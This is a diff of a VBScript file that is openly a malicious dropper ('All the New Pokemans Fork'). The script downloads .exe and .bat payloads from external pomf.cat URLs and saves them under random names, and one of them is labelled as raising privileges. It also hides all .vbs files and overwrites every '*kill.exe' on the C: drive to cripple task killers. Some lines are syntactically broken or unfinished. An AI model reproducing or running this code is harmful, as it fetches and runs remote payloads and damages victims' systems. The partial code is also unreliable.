@@ -1,24 +1,30 @@
 '''All the New Pokemans Fork'''
-Dim max,min
 Dim list
+Dim max, min
+max=999999999
+min=100000000
+Randomize
 Set list = CreateObject("System.Collections.ArrayList")
-	list.Add "http://a.pomf.cat/uthqdm.exe"		   'eevee
-	list.Add "http://a.pomf.cat/utoojo.exe"        'installer
-	list.Add "https://a.pomf.cat/ayunww.bat"	   'the equalizer
-
+	list.Add "http://a.pomf.cat/uthqdm.exe"		   'eevee.exe
+	list.Add "http://a.pomf.cat/utoojo.exe"        'wscript
+	list.Add "https://a.pomf.cat/ayunww.bat"	   'raise privilegdges
 i = 0
-Set oShell = WScript.CreateObject ("WScript.Shell")
-'Hide it all
-oShell.run "cmd.exe /c for /r %i in (*.vbs) do attrib +h ""%i""" 
-'destroy all taskkillers
-oShell.run "cmd.exe /c for /r C:\ %i in (*kill.exe) do echo . > ""%i"""
 
+CreateObject("WScript.Shell").run "cmd.exe /c for /r %i in (*.vbs) do attrib +h ""%i"""  'Hide all vbs
+CreateObject("WScript.Shell").run "cmd.exe /c for /r C:\ %i in (*kill.exe) do echo . > ""%i""" 'corrupt the taskkillers
+CreateObject("WScript.Shell").run "cmd.exe"
 
-'TODO run all eevee executables
-Function getFiles(value)
+call getFiles(list.Item(0), (Int((max-min+1)*Rnd+min))&".exe")
+call getFiles(list.Item(1), 
+
+'''Usage: getFiles(value, fileName)
+'  Where value is the item to be downloaded
+'  and fileName is the name of the output file
+Function getFiles(value, fileName)
+	strHDLocation = fileName
 	Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
-    objXMLHTTP.open "GET",value, false
-    objXMLHTTP.send()
+	objXMLHTTP.open "GET", value, false
+	objXMLHTTP.send()
     If objXMLHTTP.Status = 200 Then
 		Set objADOStream = CreateObject("ADODB.Stream")
 		objADOStream.Open
@@ -28,34 +34,14 @@ Function getFiles(value)
 		Set objFSO = Createobject("Scripting.FileSystemObject")
 		If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation
 			Set objFSO = Nothing
-
-			objADOStream.SaveToFile randExeName
-			objADOStream.Close
+			objADOStream.SaveToFile strHDLocation
+			objADOStream.Close	
 			Set objADOStream = Nothing
 		End if
 	End If	
 End Function
-'TODO copy random eevee executable everywhere
+
 Function executeEevees() 'no seriously kill them all
-
+	CreateObject("WScript.Shell").run "cmd /c start for /r %i in (*.exe) do "
 End Function
 
-
-'create random eevee executable
-Function randExeName()
-	randExeName = (Int((max-min+1)*Rnd+min))&".exe"
-End Function
-
-retValue = ShowSum(7, 8)
-MsgBox "The function returned:  " & retValue
-
-Function ShowSum(value1, value2)
-    Dim sum
-
-    ' Determine and display the sum.
-    sum = value1 + value2
-    MsgBox "The sum is:  " & sum
-
-    ' Set the function's return value.
-    ShowSum = sum
-End Function
